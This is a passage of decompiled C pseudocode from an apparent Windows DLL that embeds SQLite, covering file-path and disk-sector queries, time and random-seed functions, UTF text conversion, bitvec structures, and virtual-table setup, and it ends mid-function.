//----- (10070281) --------------------------------------------------------
int __cdecl sub_10070281(int a1, LPCCH lpMultiByteStr, int a3, BOOL *a4)
{
  BOOL v4; // ebx
  WCHAR *v5; // edi
  DWORD FileAttributesW; // eax
  DWORD v8; // esi

  v4 = 0;
  v5 = (WCHAR *)sub_1006FE75(lpMultiByteStr);
  if ( !v5 )
    return 7;
  if ( sub_1006F71E() )
    FileAttributesW = GetFileAttributesW(v5);
  else
    FileAttributesW = GetFileAttributesA((LPCSTR)v5);
  v8 = FileAttributesW;
  free(v5);
  switch ( a3 )
  {
    case 0:
      goto LABEL_9;
    case 1:
      v4 = (v8 & 1) == 0;
      break;
    case 2:
LABEL_9:
      v4 = v8 != -1;
      break;
  }
  *a4 = v4;
  return 0;
}

//----- (100702E8) --------------------------------------------------------
int __cdecl sub_100702E8(int a1, LPCCH lpMultiByteStr, int a3, int a4)
{
  DWORD v4; // esi
  WCHAR *v5; // eax
  CHAR *v7; // eax
  size_t v8; // esi
  CHAR *v9; // eax
  char *v10; // esi
  WCHAR *Block; // [esp+10h] [ebp-8h]
  WCHAR *lpFileName; // [esp+14h] [ebp-4h]

  lpFileName = (WCHAR *)sub_1006FE75(lpMultiByteStr);
  if ( sub_1006F71E() )
  {
    v4 = GetFullPathNameW(lpFileName, 0, 0, 0) + 3;
    v5 = (WCHAR *)malloc(2 * v4);
    Block = v5;
    if ( !v5 )
    {
LABEL_3:
      free(lpFileName);
      return 7;
    }
    GetFullPathNameW(lpFileName, v4, v5, 0);
    free(lpFileName);
    v7 = sub_1006F7BE(Block);
  }
  else
  {
    v8 = GetFullPathNameA((LPCSTR)lpFileName, 0, 0, 0) + 3;
    v9 = (CHAR *)malloc(v8);
    Block = (WCHAR *)v9;
    if ( !v9 )
      goto LABEL_3;
    GetFullPathNameA((LPCSTR)lpFileName, v8, v9, 0);
    free(lpFileName);
    v7 = sub_1006F882((LPCCH)Block);
  }
  v10 = v7;
  free(Block);
  if ( !v10 )
    return 7;
  sub_10055543(*(_DWORD *)(a1 + 8), a4, "%s", v10);
  free(v10);
  return 0;
}

//----- (100703C0) --------------------------------------------------------
DWORD __cdecl sub_100703C0(int a1, LPCCH lpMultiByteStr)
{
  CHAR *v2; // esi
  bool v3; // zf
  CHAR *v4; // eax
  BOOL DiskFreeSpaceA; // eax
  BOOL v6; // edi
  CHAR MultiByteStr[264]; // [esp+10h] [ebp-110h] BYREF
  DWORD BytesPerSector; // [esp+118h] [ebp-8h] BYREF
  DWORD SectorsPerCluster; // [esp+11Ch] [ebp-4h] BYREF

  BytesPerSector = 512;
  if ( !sub_100702E8(a1, lpMultiByteStr, 260, (int)MultiByteStr) )
  {
    v2 = (CHAR *)sub_1006FE75(MultiByteStr);
    if ( !v2 )
      return 512;
    v3 = !sub_1006F71E();
    v4 = v2;
    if ( v3 )
    {
      if ( *v2 )
      {
        while ( *v4 != 92 )
        {
          if ( !*++v4 )
            goto LABEL_15;
        }
        *v4 = 0;
      }
LABEL_15:
      DiskFreeSpaceA = GetDiskFreeSpaceA(
                         v2,
                         &SectorsPerCluster,
                         &BytesPerSector,
                         &SectorsPerCluster,
                         &SectorsPerCluster);
    }
    else
    {
      if ( *(_WORD *)v2 )
      {
        while ( *(_WORD *)v4 != 92 )
        {
          v4 += 2;
          if ( !*(_WORD *)v4 )
            goto LABEL_9;
        }
        *(_WORD *)v4 = 0;
      }
LABEL_9:
      DiskFreeSpaceA = GetDiskFreeSpaceW(
                         (LPCWSTR)v2,
                         &SectorsPerCluster,
                         &BytesPerSector,
                         &SectorsPerCluster,
                         &SectorsPerCluster);
    }
    v6 = DiskFreeSpaceA;
    free(v2);
    if ( !v6 )
      return 512;
  }
  return BytesPerSector;
}

//----- (10070484) --------------------------------------------------------
int __cdecl sub_10070484(int a1, unsigned int Src, char *a3)
{
  char *v3; // ebx
  unsigned int v4; // edi
  int v5; // esi
  struct _SYSTEMTIME SystemTime; // [esp+10h] [ebp-14h] BYREF

  v3 = a3;
  v4 = Src;
  v5 = 0;
  if ( Src >= 0x10 )
  {
    GetSystemTime(&SystemTime);
    v5 = 16;
    memcpy(v3, &SystemTime, 0x10u);
  }
  if ( v4 - v5 >= 4 )
  {
    Src = GetCurrentProcessId();
    memcpy(&v3[v5], &Src, 4u);
    v5 += 4;
  }
  if ( v4 - v5 >= 4 )
  {
    Src = GetTickCount();
    memcpy(&v3[v5], &Src, 4u);
    v5 += 4;
  }
  if ( v4 - v5 >= 8 )
  {
    QueryPerformanceCounter((LARGE_INTEGER *)&SystemTime.wHour);
    memcpy(&v3[v5], &SystemTime.wHour, 8u);
    v5 += 8;
  }
  return v5;
}

//----- (10070530) --------------------------------------------------------
int __cdecl sub_10070530(int a1, int a2)
{
  Sleep((a2 + 999) / 1000);
  return 1000 * ((a2 + 999) / 1000);
}

//----- (10070558) --------------------------------------------------------
int __cdecl sub_10070558(int a1, double *a2)
{
  __int64 v2; // rcx
  signed __int64 v4; // [esp-10h] [ebp-30h]
  struct _FILETIME SystemTimeAsFileTime; // [esp+18h] [ebp-8h] BYREF

  GetSystemTimeAsFileTime(&SystemTimeAsFileTime);
  v4 = SystemTimeAsFileTime.dwLowDateTime + ((unsigned __int64)SystemTimeAsFileTime.dwHighDateTime << 32);
  v2 = v4 % 864000000000i64 + 2503270400i64;
  HIDWORD(v2) += 100;
  *a2 = (double)(v2 % 864000000000i64) / (double)864000000000i64
      + (double)(v2 / 864000000000i64 + v4 / 864000000000i64 + 2305813);
  return 0;
}

//----- (100705F1) --------------------------------------------------------
int __cdecl sub_100705F1(int a1, int a2, int a3)
{
  return sub_1006FFD0(a2, a3);
}

//----- (10070605) --------------------------------------------------------
int __cdecl sub_10070605(char **a1)
{
  unsigned __int8 *v1; // ecx
  int result; // eax
  char *v3; // ecx
  char i; // dl

  result = *v1;
  v3 = (char *)(v1 + 1);
  if ( result >= 192 )
  {
    result = (unsigned __int8)byte_100FEAF0[result];
    for ( i = *v3; (i & 0xC0) == 0x80; i = *v3 )
    {
      result = (i & 0x3F) + (result << 6);
      ++v3;
    }
    if ( result < 128 || (result & 0xFFFFF800) == 55296 || (result & 0xFFFFFFFE) == 65534 )
      result = 65533;
  }
  *a1 = v3;
  return result;
}
// 10070608: variable 'v1' is possibly undefined

//----- (10070666) --------------------------------------------------------
int __cdecl sub_10070666(int a1, char a2)
{
  int v2; // ebx
  char *v4; // eax
  char *v5; // esi
  char v6; // cl
  _BYTE *v7; // eax
  int v8; // ecx
  _BYTE *v9; // edi
  _BYTE *v10; // eax
  char v11; // cl
  unsigned int v12; // ecx
  _BYTE *v13; // eax
  _BYTE *v14; // eax
  unsigned int v15; // ecx
  char v16; // dl
  unsigned int v17; // edx
  _BYTE *v18; // eax
  _BYTE *v19; // eax
  _BYTE *v20; // esi
  int v21; // ecx
  unsigned __int8 *v22; // edi
  unsigned int v23; // ecx
  __int16 v24; // dx
  unsigned __int8 *v25; // edi
  int v26; // edx
  char v27; // dl
  char v28; // dl
  unsigned __int16 v29; // cx
  unsigned __int8 *v30; // edi
  unsigned int v31; // ecx
  __int16 v32; // dx
  unsigned __int8 *v33; // edi
  int v34; // edx
  char v35; // dl
  char v36; // dl
  _BYTE *v37; // [esp+Ch] [ebp-Ch]
  _BYTE *v38; // [esp+10h] [ebp-8h]

  v2 = a1;
  if ( *(_BYTE *)(a1 + 31) == 1 )
  {
    if ( a2 != 1 )
    {
      v8 = 2 * *(_DWORD *)(a1 + 24) + 2;
      goto LABEL_12;
    }
LABEL_10:
    *(_DWORD *)(a1 + 24) &= ~1u;
    v8 = 2 * *(_DWORD *)(a1 + 24) + 1;
LABEL_12:
    v9 = *(_BYTE **)(a1 + 20);
    v38 = &v9[*(_DWORD *)(a1 + 24)];
    v10 = sub_10059073(*(_DWORD *)(a1 + 16), v8);
    v37 = v10;
    if ( !v10 )
      return 7;
    v11 = *(_BYTE *)(a1 + 31);
    if ( v11 == 1 )
    {
      if ( a2 == 2 )
      {
        while ( v9 < v38 )
        {
          v12 = (unsigned __int8)*v9++;
          if ( v12 >= 0xC0 )
          {
            v12 = (unsigned __int8)byte_100FEAF0[v12];
            while ( v9 != v38 && (*v9 & 0xC0) == 0x80 )
              v12 = (v12 << 6) + (*v9++ & 0x3F);
            if ( v12 < 0x80 || (v12 & 0xFFFFF800) == 55296 || (v12 & 0xFFFFFFFE) == 65534 )
              v12 = 65533;
          }
          if ( v12 > 0xFFFF )
          {
            *v10 = ((v12 - 0x10000) >> 10) ^ (((v12 - 0x10000) >> 10) ^ (v12 >> 10)) & 0x3F;
            v2 = a1;
            v13 = v10 + 1;
            *v13 = (((v12 - 0x10000) >> 18) & 3) - 40;
            v10 = v13 + 1;
            *v10 = v12;
            LOBYTE(v12) = (BYTE1(v12) & 3) - 36;
          }
          else
          {
            *v10 = v12;
            v12 >>= 8;
          }
          v14 = v10 + 1;
          *v14 = v12;
          v10 = v14 + 1;
        }
      }
      else
      {
        while ( v9 < v38 )
        {
          v15 = (unsigned __int8)*v9++;
          if ( v15 >= 0xC0 )
          {
            v15 = (unsigned __int8)byte_100FEAF0[v15];
            if ( v9 != v38 )
            {
              do
              {
                v16 = *v9;
                if ( (*v9 & 0xC0) != 0x80 )
                  break;
                ++v9;
                v15 = (v15 << 6) + (v16 & 0x3F);
              }
              while ( v9 != v38 );
              v2 = a1;
            }
            if ( v15 < 0x80 || (v15 & 0xFFFFF800) == 55296 || (v15 & 0xFFFFFFFE) == 65534 )
              v15 = 65533;
          }
          if ( v15 > 0xFFFF )
          {
            *v10 = (((v15 - 0x10000) >> 18) & 3) - 40;
            v18 = v10 + 1;
            *v18 = ((v15 - 0x10000) >> 10) ^ (((v15 - 0x10000) >> 10) ^ (v15 >> 10)) & 0x3F;
            v2 = a1;
            v10 = v18 + 1;
            LOBYTE(v17) = (BYTE1(v15) & 3) - 36;
          }
          else
          {
            v17 = v15 >> 8;
          }
          *v10 = v17;
          v19 = v10 + 1;
          *v19 = v15;
          v10 = v19 + 1;
        }
      }
      v20 = v37;
      *(_DWORD *)(v2 + 24) = v10 - v37;
      *v10++ = 0;
    }
    else
    {
      if ( v11 == 2 )
      {
        while ( v9 < v38 )
        {
          v21 = (unsigned __int8)*v9;
          v22 = v9 + 1;
          v23 = (*v22 << 8) + v21;
          v9 = v22 + 1;
          if ( v23 - 55296 <= 0x7FF && v9 < v38 )
          {
            v24 = (unsigned __int8)*v9;
            v25 = v9 + 1;
            v26 = ((*v25 << 8) + v24) & 0x3FF;
            v9 = v25 + 1;
            v23 = v26 + (((v23 & 0x3FF) + 64) << 10);
          }
          if ( v23 >= 0x80 )
          {
            if ( v23 >= 0x800 )
            {
              if ( v23 >= 0x10000 )
              {
                *v10++ = ((v23 >> 18) & 7) - 16;
                v28 = ((v23 >> 12) & 0x3F) + 0x80;
              }
              else
              {
                v28 = ((v23 >> 12) & 0xF) - 32;
              }
              *v10++ = v28;
              v27 = ((v23 >> 6) & 0x3F) + 0x80;
            }
            else
            {
              v27 = ((v23 >> 6) & 0x1F) - 64;
            }
            *v10++ = v27;
            LOBYTE(v23) = (v23 & 0x3F) + 0x80;
          }
          *v10++ = v23;
        }
      }
      else
      {
        while ( v9 < v38 )
        {
          LOBYTE(v29) = 0;
          HIBYTE(v29) = *v9;
          v30 = v9 + 1;
          v31 = *v30 + v29;
          v9 = v30 + 1;
          if ( v31 - 55296 <= 0x7FF && v9 < v38 )
          {
            LOBYTE(v32) = 0;
            HIBYTE(v32) = *v9;
            v33 = v9 + 1;
            v34 = (*v33 + v32) & 0x3FF;
            v9 = v33 + 1;
            v31 = v34 + (((v31 & 0x3FF) + 64) << 10);
          }
          if ( v31 >= 0x80 )
          {
            if ( v31 >= 0x800 )
            {
              if ( v31 >= 0x10000 )
              {
                *v10++ = ((v31 >> 18) & 7) - 16;
                v36 = ((v31 >> 12) & 0x3F) + 0x80;
              }
              else
              {
                v36 = ((v31 >> 12) & 0xF) - 32;
              }
              *v10++ = v36;
              v35 = ((v31 >> 6) & 0x3F) + 0x80;
            }
            else
            {
              v35 = ((v31 >> 6) & 0x1F) - 64;
            }
            *v10++ = v35;
            LOBYTE(v31) = (v31 & 0x3F) + 0x80;
          }
          *v10++ = v31;
        }
      }
      v20 = v37;
      *(_DWORD *)(a1 + 24) = v10 - v37;
    }
    *v10 = 0;
    sub_10059FC7((int *)v2);
    *(_BYTE *)(v2 + 31) = a2;
    *(_WORD *)(v2 + 28) = *(_WORD *)(v2 + 28) & 0xE1FF | 0x600;
    *(_DWORD *)(v2 + 20) = v20;
    *(_DWORD *)(v2 + 36) = v20;
    return 0;
  }
  if ( a2 == 1 )
    goto LABEL_10;
  if ( sub_10059E08(a1) )
    return 7;
  v4 = *(char **)(a1 + 20);
  v5 = &v4[*(_DWORD *)(a1 + 24) & 0xFFFFFFFE];
  while ( v4 < v5 )
  {
    v6 = *v4;
    *v4 = v4[1];
    v7 = v4 + 1;
    *v7 = v6;
    v4 = v7 + 1;
  }
  *(_BYTE *)(a1 + 31) = a2;
  return 0;
}

//----- (10070A34) --------------------------------------------------------
int __usercall sub_10070A34@<eax>(int a1@<esi>)
{
  int v1; // edi
  char v2; // bl
  char *v3; // eax
  char v4; // cl
  bool v5; // zf
  char v6; // al

  v1 = 0;
  v2 = 0;
  if ( *(int *)(a1 + 24) > 1 )
  {
    v3 = *(char **)(a1 + 20);
    v4 = *v3;
    v5 = *v3 == -2;
    v6 = v3[1];
    if ( v5 )
    {
      if ( v6 != -1 )
        return v1;
      v2 = 3;
    }
    if ( v4 == -1 && v6 == -2 )
      v2 = 2;
    if ( v2 )
    {
      v1 = sub_10059E08(a1);
      if ( !v1 )
      {
        *(_DWORD *)(a1 + 24) -= 2;
        memcpy_0(*(void **)(a1 + 20), (const void *)(*(_DWORD *)(a1 + 20) + 2), *(_DWORD *)(a1 + 24));
        *(_BYTE *)(*(_DWORD *)(a1 + 24) + *(_DWORD *)(a1 + 20)) = 0;
        *(_BYTE *)(*(_DWORD *)(a1 + 24) + *(_DWORD *)(a1 + 20) + 1) = 0;
        *(_WORD *)(a1 + 28) |= 0x200u;
        *(_BYTE *)(a1 + 31) = v2;
      }
    }
  }
  return v1;
}

//----- (10070AAB) --------------------------------------------------------
int __fastcall sub_10070AAB(unsigned __int8 *a1, int a2)
{
  int v2; // esi
  unsigned int v3; // edx
  unsigned __int8 v4; // al

  v2 = 0;
  if ( a2 < 0 )
    v3 = -1;
  else
    v3 = (unsigned int)&a1[a2];
  while ( *a1 && (unsigned int)a1 < v3 )
  {
    v4 = *a1++;
    if ( v4 >= 0xC0u )
    {
      while ( (*a1 & 0xC0) == 0x80 )
        ++a1;
    }
    ++v2;
  }
  return v2;
}

//----- (10070ADB) --------------------------------------------------------
_DWORD *__usercall sub_10070ADB@<eax>(int a1@<esi>, _BYTE *a2, int a3)
{
  int v4[10]; // [esp+0h] [ebp-28h] BYREF

  memset(v4, 0, sizeof(v4));
  v4[4] = a1;
  sub_1005A3FE(0, (int)v4, a3, a2, 2);
  sub_10059D24((int)v4, 1);
  if ( *(_BYTE *)(a1 + 30) )
  {
    sub_10059FC7(v4);
    v4[5] = 0;
  }
  if ( (v4[7] & 0x400) != 0 )
    return (_DWORD *)v4[5];
  else
    return sub_10059194((_BYTE *)v4[5]);
}

//----- (10070B4E) --------------------------------------------------------
_QWORD *__cdecl sub_10070B4E(int a1)
{
  signed int v1; // esi
  _QWORD *v2; // ecx

  v1 = (a1 + 7) & 0xFFFFFFF8;
  v2 = malloc(v1 + 8);
  if ( v2 )
    *v2++ = v1;
  return v2;
}

//----- (10070B7B) --------------------------------------------------------
void __cdecl sub_10070B7B(int a1)
{
  free((void *)(a1 - 8));
}

//----- (10070B8D) --------------------------------------------------------
_QWORD *__cdecl sub_10070B8D(int a1, int a2)
{
  signed int v2; // esi
  _QWORD *v3; // ecx

  v2 = (a2 + 7) & 0xFFFFFFF8;
  v3 = realloc((void *)(a1 - 8), v2 + 8);
  if ( v3 )
    *v3++ = v2;
  return v3;
}

//----- (10070BC2) --------------------------------------------------------
int __cdecl sub_10070BC2(int a1)
{
  int result; // eax

  result = a1;
  if ( a1 )
    return *(_DWORD *)(a1 - 8);
  return result;
}

//----- (10070BD3) --------------------------------------------------------
unsigned int __cdecl sub_10070BD3(int a1)
{
  return (a1 + 7) & 0xFFFFFFF8;
}

//----- (10070BE1) --------------------------------------------------------
_DWORD *__cdecl sub_10070BE1(int a1)
{
  _DWORD *result; // eax

  result = sub_10059025(0x200u);
  if ( result )
    *result = a1;
  return result;
}

//----- (10070BFA) --------------------------------------------------------
BOOL __usercall sub_10070BFA@<eax>(unsigned int a1@<eax>, unsigned int *a2@<ecx>)
{
  unsigned int *v2; // esi
  unsigned int v3; // edi
  unsigned int v4; // ecx
  unsigned int v6; // edx
  unsigned int v7; // edi
  unsigned int v8; // eax

  v2 = a2;
  if ( a2 && a1 <= *a2 && a1 )
  {
    v3 = a1 - 1;
    while ( v2[2] )
    {
      v4 = v2[2];
      v2 = (unsigned int *)v2[v3 / v4 + 3];
      v3 %= v4;
      if ( !v2 )
        return 0;
    }
    if ( *v2 <= 0xFA0 )
      return (*((_BYTE *)v2 + (v3 >> 3) + 12) & (unsigned __int8)(1 << (v3 & 7))) != 0;
    v6 = v3 % 0x7D;
    v7 = v3 + 1;
    while ( 1 )
    {
      v8 = v2[v6 + 3];
      if ( !v8 )
        break;
      if ( v8 == v7 )
        return 1;
      v6 = (v6 + 1) % 0x7D;
    }
  }
  return 0;
}

//----- (10070C77) --------------------------------------------------------
int __cdecl sub_10070C77(_DWORD *a1, int a2)
{
  _DWORD *v2; // edi
  unsigned int v4; // ecx
  _DWORD *v5; // edi
  _DWORD *v6; // eax
  unsigned int v7; // edx
  int v8; // eax
  unsigned int v9; // eax
  _DWORD *v10; // eax
  int v11; // ebx
  unsigned int i; // esi
  unsigned int v13; // [esp+10h] [ebp+8h]
  unsigned int v14; // [esp+14h] [ebp+Ch]
  unsigned int v15; // [esp+14h] [ebp+Ch]

  v2 = a1;
  if ( !a1 )
    return 0;
  v14 = a2 - 1;
  if ( *a1 <= 0xFA0u )
  {
LABEL_9:
    *((_BYTE *)v2 + (v14 >> 3) + 12) |= 1 << (v14 & 7);
    return 0;
  }
  do
  {
    v4 = v2[2];
    if ( !v4 )
      break;
    v5 = &v2[v14 / v4 + 3];
    v14 %= v4;
    if ( !*v5 )
    {
      v6 = sub_10070BE1(v4);
      *v5 = v6;
      if ( !v6 )
        return 7;
    }
    v2 = (_DWORD *)*v5;
  }
  while ( *v2 > 0xFA0u );
  if ( *v2 <= 0xFA0u )
    goto LABEL_9;
  v7 = v14 % 0x7D;
  v15 = v14 + 1;
  v8 = v2[v7 + 3];
  if ( v8 )
  {
    while ( v8 != v15 )
    {
      if ( ++v7 >= 0x7D )
        v7 = 0;
      v8 = v2[v7 + 3];
      if ( !v8 )
        goto LABEL_19;
    }
    return 0;
  }
  v9 = v2[1];
  if ( v9 < 0x7C )
  {
LABEL_12:
    v2[1] = v9 + 1;
    v2[v7 + 3] = v15;
    return 0;
  }
LABEL_19:
  v9 = v2[1];
  if ( v9 < 0x3E )
    goto LABEL_12;
  v10 = sub_10059073(0, 500);
  v13 = (unsigned int)v10;
  if ( !v10 )
    return 7;
  memcpy(v10, v2 + 3, 0x1F4u);
  memset(v2 + 3, 0, 0x1F4u);
  v2[2] = (*v2 + 124) / 0x7Du;
  v11 = sub_10070C77(v2, v15);
  for ( i = 0; i < 0x7D; ++i )
  {
    if ( *(_DWORD *)(v13 + 4 * i) )
      v11 |= sub_10070C77(v2, *(_DWORD *)(v13 + 4 * i));
  }
  sub_10058EC7(0, v13);
  return v11;
}

//----- (10070DAA) --------------------------------------------------------
char __usercall sub_10070DAA@<al>(int a1@<eax>, int a2, char *a3)
{
  _DWORD *v3; // esi
  unsigned int v4; // ecx
  int *v5; // ecx
  unsigned int v6; // edx
  unsigned int i; // [esp+4h] [ebp-4h]
  unsigned int v9; // [esp+10h] [ebp+8h]

  v3 = (_DWORD *)a1;
  if ( a1 )
  {
    v9 = a2 - 1;
    while ( v3[2] )
    {
      v4 = v3[2];
      a1 = v9 / v4;
      v3 = (_DWORD *)v3[v9 / v4 + 3];
      v9 %= v4;
      if ( !v3 )
        return a1;
    }
    if ( *v3 > 0xFA0u )
    {
      memcpy(a3, v3 + 3, 0x1F4u);
      memset(v3 + 3, 0, 0x1F4u);
      v3[1] = 0;
      for ( i = 0; i < 0x7D; ++i )
      {
        v5 = (int *)&a3[4 * i];
        a1 = *v5;
        if ( *v5 && a1 != v9 + 1 )
        {
          v6 = (a1 - 1) % 0x7Du;
          ++v3[1];
          while ( v3[v6 + 3] )
          {
            if ( ++v6 >= 0x7D )
              v6 = 0;
          }
          a1 = *v5;
          v3[v6 + 3] = *v5;
        }
      }
    }
    else
    {
      LOBYTE(a1) = ~(1 << (v9 & 7));
      *((_BYTE *)v3 + (v9 >> 3) + 12) &= a1;
    }
  }
  return a1;
}

//----- (10070E6B) --------------------------------------------------------
void __cdecl sub_10070E6B(int a1)
{
  _DWORD *v1; // esi
  int v2; // ebx

  if ( a1 )
  {
    if ( *(_DWORD *)(a1 + 8) )
    {
      v1 = (_DWORD *)(a1 + 12);
      v2 = 125;
      do
      {
        sub_10070E6B(*v1++);
        --v2;
      }
      while ( v2 );
    }
    sub_10058E74(a1);
  }
}

//----- (10070E9E) --------------------------------------------------------
_DWORD *__usercall sub_10070E9E@<eax>(int a1@<eax>, int a2)
{
  _DWORD *result; // eax

  for ( result = *(_DWORD **)(a1 + 52); result && *result != a2; result = (_DWORD *)result[4] )
    ;
  return result;
}

//----- (10070EB6) --------------------------------------------------------
void __usercall sub_10070EB6(int *a1@<esi>)
{
  bool v1; // zf
  int v2; // edi
  int v3; // eax

  v1 = a1[3]-- == 1;
  v2 = *a1;
  if ( v1 )
  {
    v3 = a1[2];
    if ( v3 )
      (*(void (__cdecl **)(int))(*(_DWORD *)v3 + 16))(a1[2]);
    sub_10058EC7(v2, (unsigned int)a1);
  }
}

//----- (10070ED7) --------------------------------------------------------
_DWORD *__usercall sub_10070ED7@<eax>(int a1@<edx>, int a2)
{
  _DWORD *v2; // ecx
  _DWORD *result; // eax
  _DWORD *v4; // edi
  _DWORD *v5; // esi

  v2 = *(_DWORD **)(a1 + 52);
  result = 0;
  *(_DWORD *)(a1 + 52) = 0;
  if ( v2 )
  {
    do
    {
      v4 = (_DWORD *)v2[4];
      if ( *v2 == a2 )
      {
        *(_DWORD *)(a1 + 52) = v2;
        v2[4] = 0;
        result = v2;
      }
      else
      {
        v5 = (_DWORD *)(*v2 + 288);
        v2[4] = *v5;
        *v5 = v2;
      }
      v2 = v4;
    }
    while ( v4 );
  }
  return result;
}

//----- (10070F16) --------------------------------------------------------
void __usercall sub_10070F16(int a1@<eax>)
{
  int *v1; // esi
  int *v2; // edi

  v1 = *(int **)(a1 + 288);
  *(_DWORD *)(a1 + 288) = 0;
  if ( v1 )
  {
    sub_1005C640(a1);
    do
    {
      v2 = (int *)v1[4];
      sub_10070EB6(v1);
      v1 = v2;
    }
    while ( v2 );
  }
}

//----- (10070F3D) --------------------------------------------------------
void __usercall sub_10070F3D(int a1@<esi>, int a2, unsigned int a3)
{
  int v3; // edi
  _DWORD *v4; // eax
  _DWORD *v5; // ebx
  unsigned int *v6; // eax
  int i; // [esp+8h] [ebp-4h]

  v3 = *(_DWORD *)(a1 + 56);
  *(_DWORD *)(a1 + 56) = v3 + 1;
  v4 = sub_100590DA(a2, *(void **)(a1 + 60), 4 * (v3 + 1) + 4);
  v5 = v4;
  if ( v4 )
  {
    v6 = &v4[v3];
    v6[1] = 0;
    *v6 = a3;
  }
  else
  {
    for ( i = 0; i < v3; ++i )
      sub_10058EC7(a2, *(_DWORD *)(*(_DWORD *)(a1 + 60) + 4 * i));
    sub_10058EC7(a2, a3);
    sub_10058EC7(a2, *(_DWORD *)(a1 + 60));
    *(_DWORD *)(a1 + 56) = 0;
  }
  *(_DWORD *)(a1 + 60) = v5;
}

//----- (10070FBC) --------------------------------------------------------
void __usercall sub_10070FBC(int a1@<eax>, int *a2, _DWORD *a3, _DWORD *a4)
{
  int v4; // edi
  int v5; // ebx
  int v6; // eax
  int v7; // eax
  _DWORD *v8; // eax
  _DWORD *v9; // eax
  int v10; // [esp+10h] [ebp-4h]

  sub_1006A41E(a1, (int)a2, (int)a3, 0, 0, 1, 0);
  v4 = a2[125];
  if ( v4 )
  {
    v5 = *a2;
    v6 = sub_1005855F(*a2, *(_DWORD *)(v4 + 68));
    *(_BYTE *)(v4 + 34) |= 0x10u;
    *(_DWORD *)(v4 + 56) = 0;
    v10 = v6;
    v7 = sub_1006A297((int)a4, v5);
    sub_10070F3D(v4, v5, v7);
    v8 = sub_10059194(*(_BYTE **)(16 * v10 + *(_DWORD *)(v5 + 8)));
    sub_10070F3D(v4, v5, (unsigned int)v8);
    v9 = sub_10059194(*(_BYTE **)(v4 + 4));
    sub_10070F3D(v4, v5, (unsigned int)v9);
    a2[121] = *a4 + a4[1] - *a3;
  }
}

//----- (1007105D) --------------------------------------------------------
void __usercall sub_1007105D(int *a1@<eax>)
{
  void *v2; // eax
  int v3; // ebx
  _DWORD *v4; // eax

  v2 = (void *)a1[128];
  if ( v2 )
  {
    if ( a1[125] )
    {
      v3 = *a1;
      v4 = sub_100591D0(*a1, a1[129], v2);
      sub_10070F3D(a1[125], v3, (unsigned int)v4);
    }
  }
}

//----- (10071099) --------------------------------------------------------
void __cdecl sub_10071099(int *a1, _DWORD *a2)
{
  int v3; // ebx
  int v4; // edi
  char *v5; // ecx
  unsigned __int16 *v7; // eax
  unsigned __int16 *v8; // ebx
  _BYTE *v9; // eax
  _BYTE *v10; // eax
  int v11; // edx
  unsigned __int8 *v12; // ecx
  int v13; // [esp+Ch] [ebp-Ch]
  int v14; // [esp+10h] [ebp-8h]
  int v15; // [esp+14h] [ebp-4h]
  int *v16; // [esp+20h] [ebp+8h]
  int v17; // [esp+20h] [ebp+8h]

  v3 = a1[125];
  v4 = *a1;
  v14 = *a1;
  if ( v3 )
  {
    sub_1007105D(a1);
    a1[128] = 0;
    if ( *(int *)(v3 + 56) >= 1 )
    {
      if ( *(_BYTE *)(v4 + 124) )
      {
        v17 = *(_DWORD *)(v3 + 68);
        v10 = sub_10059297(*(_BYTE **)(v3 + 4));
        if ( sub_10069032((unsigned int *)(v11 + 4), v12, (int)v10, (int *)v3) )
        {
          *(_BYTE *)(v14 + 30) = 1;
        }
        else
        {
          *(_DWORD *)(v17 + 80) = *a1;
          a1[125] = 0;
        }
      }
      else
      {
        if ( a2 )
          a1[121] = *a2 + a2[1] - a1[120];
        v13 = sub_10055484(v4, aCreateVirtualT, a1 + 120);
        v15 = sub_1005855F(v4, *(_DWORD *)(v3 + 68));
        v5 = aSqliteTempMast_7;
        if ( v15 != 1 )
          v5 = aSqliteMaster_7;
        sub_10069DB8(
          (int)a1,
          aUpdateQSSetTyp_0,
          *(_DWORD *)(16 * v15 + *(_DWORD *)(v4 + 8)),
          v5,
          *(_DWORD *)(v3 + 4),
          *(_DWORD *)(v3 + 4),
          v13,
          a1[102]);
        sub_10058EC7(v14, v13);
        v16 = sub_1007C271(a1);
        sub_1006AB7A(a1, v15);
        sub_1005AB66((int)v16, 119, 0, 0, 0);
        v7 = (unsigned __int16 *)sub_10055484(v14, aNameQ_0, *(_DWORD *)(v3 + 4));
        sub_1005AC02(v16, 98, v15, 1, 0, v7, (_BYTE *)0xFFFFFFFF);
        v8 = *(unsigned __int16 **)(v3 + 4);
        v9 = sub_10059297(v8);
        sub_1005AC02(v16, 122, v15, 0, 0, v8, v9 + 1);
      }
    }
  }
}
// 100711D7: variable 'v11' is possibly undefined
// 100711DC: variable 'v12' is possibly undefined

//----- (10071204) --------------------------------------------------------
int __usercall sub_10071204@<eax>(
        int a1@<ebx>,
        int a2,
        _DWORD *a3,
        int (__cdecl *a4)(int, _DWORD, int, int, int *, const char **),
        int *a5)
{
  int v5; // eax
  int v6; // esi
  int *v8; // edi
  int v9; // eax
  int v10; // eax
  _DWORD *v11; // eax
  bool v12; // cc
  _BYTE *v13; // edi
  int v14; // esi
  unsigned __int8 *v15; // ecx
  char v16; // al
  char v17; // al
  _BYTE *v18; // eax
  int v19; // edx
  _BYTE *v20; // ecx
  const char *v21; // [esp-Ch] [ebp-34h]
  int v22; // [esp+Ch] [ebp-1Ch]
  int v23; // [esp+Ch] [ebp-1Ch]
  const char *v24; // [esp+10h] [ebp-18h]
  int v25; // [esp+14h] [ebp-14h]
  int v26; // [esp+14h] [ebp-14h]
  int v27; // [esp+1Ch] [ebp-Ch]
  const char *v28; // [esp+20h] [ebp-8h] BYREF
  _BYTE *v29; // [esp+24h] [ebp-4h]

  v5 = *(_DWORD *)(a1 + 60);
  v28 = 0;
  v6 = a2;
  v22 = v5;
  v25 = *(_DWORD *)(a1 + 56);
  v24 = (const char *)sub_10055484(a2, "%s", *(const char **)(a1 + 4));
  if ( !v24 )
    return 7;
  v8 = sub_1005904B(a2, 0x14u);
  if ( !v8 )
  {
    sub_10058EC7(a2, (unsigned int)v24);
    return 7;
  }
  *v8 = a2;
  v8[1] = (int)a3;
  *(_DWORD *)(a2 + 276) = a1;
  v9 = a4(a2, a3[2], v25, v22, v8 + 2, &v28);
  v23 = v9;
  if ( v9 == 7 )
    *(_BYTE *)(a2 + 30) = 1;
  if ( v9 )
  {
    if ( v28 )
    {
      v10 = sub_10055484(a2, "%s", v28);
      v21 = v28;
      *a5 = v10;
      sub_10058EC7(a2, (unsigned int)v21);
    }
    else
    {
      *a5 = sub_10055484(a2, "vtable constructor failed: %s", v24);
    }
    sub_10058EC7(a2, (unsigned int)v8);
    goto LABEL_38;
  }
